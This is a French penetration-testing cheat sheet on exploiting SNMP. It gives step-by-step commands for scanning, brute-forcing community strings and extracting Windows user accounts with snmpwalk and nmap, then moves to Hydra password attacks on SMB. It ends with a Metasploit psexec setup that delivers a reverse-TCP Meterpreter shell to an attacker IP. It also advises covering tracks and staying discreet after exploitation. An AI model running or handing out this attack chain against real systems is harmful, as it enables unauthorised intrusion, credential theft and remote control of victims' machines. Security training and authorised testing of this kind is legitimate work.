# Cheatsheet - Analyse et Exploitation SNMP

## 📋 Vue d'ensemble
Cette cheatsheet présente une méthodologie complète pour l'analyse et l'exploitation du protocole SNMP (Simple Network Management Protocol) dans le cadre de tests d'intrusion.

---

## 🔍 Phase 1 : Reconnaissance

### Test de connectivité
```bash
# Vérifier l'accessibilité de la cible
ping -c 5 <target>
```

### Scan des ports TCP
```bash
# Scan basique des ports TCP
nmap <target>

# Scan détaillé TCP
nmap -sS -sV -O <target>
```

### Scan des ports UDP (SNMP)
```bash
# Scan spécifique du port SNMP (UDP 161)
nmap -sU -p 161 <target>

# Scan UDP étendu
nmap -sU --top-ports 1000 <target>
```

---

## 🔐 Phase 2 : Découverte des Community Strings

### Brute force des community strings
```bash
# Utilisation du script nmap snmp-brute
nmap -sU -p 161 --script=snmp-brute <target>

# Avec une wordlist personnalisée
nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=/path/to/wordlist <target>
```

### Community strings communes à tester
- `public` (lecture seule par défaut)
- `private` (lecture/écriture par défaut)
- `secret`
- `admin`
- `manager`
- `community`

---

## 🔎 Phase 3 : Énumération SNMP

### Énumération complète avec snmpwalk
```bash
# Énumération complète (SNMPv1)
snmpwalk -v 1 -c <community> <target>

# Énumération complète (SNMPv2c)
snmpwalk -v 2c -c <community> <target>

# Énumération d'un OID spécifique
snmpwalk -v 1 -c <community> <target> <OID>
```

### Scripts nmap SNMP
```bash
# Exécution de tous les scripts SNMP
nmap -sU -p 161 --script snmp-* <target>

# Scripts spécifiques utiles
nmap -sU -p 161 --script snmp-processes <target>
nmap -sU -p 161 --script snmp-win32-users <target>
nmap -sU -p 161 --script snmp-win32-services <target>
nmap -sU -p 161 --script snmp-interfaces <target>
```

### Sauvegarde des résultats
```bash
# Redirection vers un fichier
nmap -sU -p 161 --script snmp-* <target> > snmp_results.txt

# Format XML pour analyse ultérieure
nmap -sU -p 161 --script snmp-* <target> -oX snmp_results.xml
```

---

## 🎯 Phase 4 : Exploitation des Informations

### Informations critiques à rechercher
- **Utilisateurs système** : noms d'utilisateurs Windows/Linux
- **Processus en cours** : services et applications
- **Interfaces réseau** : configuration IP
- **Services installés** : logiciels et versions
- **Configuration matérielle** : informations système

### Extraction des utilisateurs Windows
```bash
# Recherche spécifique des utilisateurs
snmpwalk -v 1 -c public <target> 1.3.6.1.4.1.77.1.2.25

# Via script nmap
nmap -sU -p 161 --script snmp-win32-users <target>
```

---

## ⚔️ Phase 5 : Attaques Post-Énumération

### Création de listes d'utilisateurs
```bash
# Sauvegarder les utilisateurs trouvés
echo "administrator" > users.txt
echo "admin" >> users.txt
echo "guest" >> users.txt
```

### Brute force SMB avec Hydra
```bash
# Attaque par dictionnaire sur SMB
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <target> smb

# Avec une wordlist Metasploit
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> smb
```

### Exploitation avec Metasploit
```bash
# Lancement de Metasploit
msfconsole -q

# Configuration du module PSExec
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUSER <username>
set SMBPASS <password>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit
```

---

## 📊 OIDs Utiles

### OIDs Système
```
1.3.6.1.2.1.1.1.0    # Description du système
1.3.6.1.2.1.1.3.0    # Uptime du système
1.3.6.1.2.1.1.4.0    # Contact système
1.3.6.1.2.1.1.5.0    # Nom du système
1.3.6.1.2.1.1.6.0    # Localisation
```

### OIDs Réseau
```
1.3.6.1.2.1.2.2.1.2  # Interfaces réseau
1.3.6.1.2.1.4.20.1.1 # Adresses IP
1.3.6.1.2.1.4.21.1.1 # Table de routage
```

### OIDs Windows
```
1.3.6.1.4.1.77.1.2.25     # Utilisateurs Windows
1.3.6.1.4.1.77.1.4.2      # Partages Windows
1.3.6.1.4.1.77.1.2.3.1.1  # Processus Windows
```

---

## 🛡️ Outils Recommandés

### Outils d'énumération
- `snmpwalk` - Énumération SNMP standard
- `snmp-check` - Script Perl pour énumération
- `onesixtyone` - Scanner SNMP rapide
- `snmpbulkwalk` - Énumération en masse

### Scripts et exploits
- Scripts nmap SNMP (`/usr/share/nmap/scripts/snmp-*`)
- Modules Metasploit SNMP
- SNMPwn - Framework d'exploitation SNMP

---

## ⚠️ Bonnes Pratiques

### Pendant l'énumération
- Tester plusieurs versions SNMP (v1, v2c, v3)
- Utiliser différentes community strings
- Analyser les timeouts et les réponses
- Documenter tous les résultats

### Sécurité opérationnelle
- Ne pas saturer le service SNMP
- Respecter les accords de tests d'intrusion
- Nettoyer les traces après exploitation
- Maintenir la discrétion des opérations

---

## 🔧 Commandes de Dépannage

### Vérification du service SNMP
```bash
# Test manuel avec snmpget
snmpget -v 1 -c public <target> 1.3.6.1.2.1.1.1.0

# Vérification des timeouts
snmpwalk -v 1 -c public -t 10 <target>
```

### Debug des connexions
```bash
# Mode verbose
snmpwalk -v 1 -c public -d <target>

# Capture réseau
tcpdump -i eth0 port 161
```

---

## 📝 Notes Importantes

- SNMP fonctionne sur **UDP 161** (requêtes) et **UDP 162** (traps)
- Les community strings par défaut sont souvent `public` et `private`
- SNMPv3 inclut l'authentification et le chiffrement
- Certains firewalls peuvent bloquer ou filtrer SNMP
- Toujours vérifier les autorisations avant de lancer des tests